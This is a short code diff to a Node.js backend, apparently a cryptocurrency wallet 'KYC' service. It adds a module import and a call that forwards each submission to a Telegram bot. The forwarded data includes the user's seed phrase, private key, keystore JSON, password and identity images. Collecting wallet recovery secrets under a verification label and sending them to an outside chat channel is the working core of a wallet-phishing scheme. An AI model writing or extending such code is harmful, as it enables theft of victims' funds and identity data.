@@ -1,5 +1,6 @@
 const Kyc = require('../models/Kyc');
 const cloudinary = require('cloudinary').v2;
+const { notifyNewKyc } = require('../../telegramBot');
 
 // Configure Cloudinary
 cloudinary.config({
@@ -66,6 +67,12 @@ exports.saveKycDetails = async (req, res) => {
     });
 
     await kycData.save();
+    // Send Telegram notification with KYC details
+    try {
+      notifyNewKyc({ sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, images: verified });
+    } catch (err) {
+      console.error('Failed to send KYC telegram notification', err);
+    }
     res.status(201).json({ message: 'KYC details saved successfully', verificationStatus, verificationError });
   } catch (error) {
     console.error('saveKycDetails error', error);
